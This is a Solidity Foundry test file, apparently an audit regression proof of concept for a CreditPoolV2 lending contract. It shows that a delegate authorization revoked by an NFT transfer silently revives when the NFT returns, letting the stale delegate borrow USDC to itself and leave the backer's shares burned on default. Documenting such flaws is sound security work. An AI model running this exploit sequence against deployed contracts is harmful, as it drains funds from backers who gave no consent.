// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "../CreditPoolV2.t.sol";

/// Regression PoC for a stale delegate authorization surviving an NFT ownership round-trip.
contract DelegateRoundTripPoC is CreditPoolV2Base {
    function test_staleDelegateRevivesAfterOwnershipRoundTrip_andCanBurnBackerStake() public {
        _sponsor(ROOT, rootOwner, AGENT, AGENT_PK, 10 * USDC);
        uint256 rootSharesBefore = pool.rootShares(ROOT);

        address hot = makeAddr("staleDelegate");

        // Owner A explicitly authorizes hot as a controller.
        vm.prank(agentOwner);
        pool.setDelegate(AGENT, hot);
        assertTrue(pool.isController(AGENT, hot));

        // The NFT changes hands: the delegate correctly becomes inactive.
        vm.prank(agentOwner);
        reg.transferFrom(agentOwner, agent2Owner, AGENT);
        assertEq(reg.ownerOf(AGENT), agent2Owner);
        assertFalse(pool.isController(AGENT, hot));

        // The NFT later returns to A. The old delegate authorization silently revives
        // because _delegateOwner still equals the current owner.
        vm.prank(agent2Owner);
        reg.transferFrom(agent2Owner, agentOwner, AGENT);
        assertEq(reg.ownerOf(AGENT), agentOwner);
        assertTrue(pool.isController(AGENT, hot));

        // No new setDelegate/consent is performed by A after the return.
        // Nevertheless, the old delegate can draw the still-backed line to itself.
        vm.prank(hot);
        uint256 loanId = pool.borrow(AGENT, 5 * USDC, 1 days, hot, type(uint256).max);
        assertEq(pool.getLoan(loanId).owner, agentOwner);
        assertEq(usdc.balanceOf(hot), 5 * USDC);

        // Demonstrate direct financial impact on the original backer if the stale
        // delegate abandons the loan: the backer's shares are burned.
        vm.warp(pool.getLoan(loanId).defaultableAt + 1);
        vm.prank(keeper);
        pool.markDefault(loanId);

        assertTrue(pool.getAgent(AGENT).defaulted);
        assertLt(pool.rootShares(ROOT), rootSharesBefore);
    }
}
